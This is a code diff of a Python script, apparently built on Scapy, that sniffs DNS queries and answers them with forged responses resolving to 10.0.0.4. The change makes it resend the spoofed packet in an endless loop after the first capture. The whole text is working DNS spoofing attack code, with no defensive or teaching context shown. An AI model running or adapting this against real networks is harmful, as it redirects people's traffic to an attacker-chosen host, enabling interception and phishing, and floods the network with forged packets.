@@ -36,8 +36,17 @@ def sendResponse(originPacket):
     responsePacket[DNSRR].rdata = "10.0.0.4"
     responsePacket[DNSRR].ttl = 294
     responsePacket[DNSRR].rdlen = 4
+    global RESPONSE_PACKET
+    RESPONSE_PACKET = responsePacket
+    global SENT
+    SENT = True
     send(responsePacket)
     return "SENT DNS RESPONSE"
 
-while True:
-    sniff(filter=BPF_FILTER, prn=sendResponse, iface=IFACE)
+if __name__ == "__main__":
+    
+    while True:
+        sniff(count = 1, filter=BPF_FILTER, prn=sendResponse, iface=IFACE)
+        if SENT:
+            while True:
+                send(RESPONSE_PACKET)
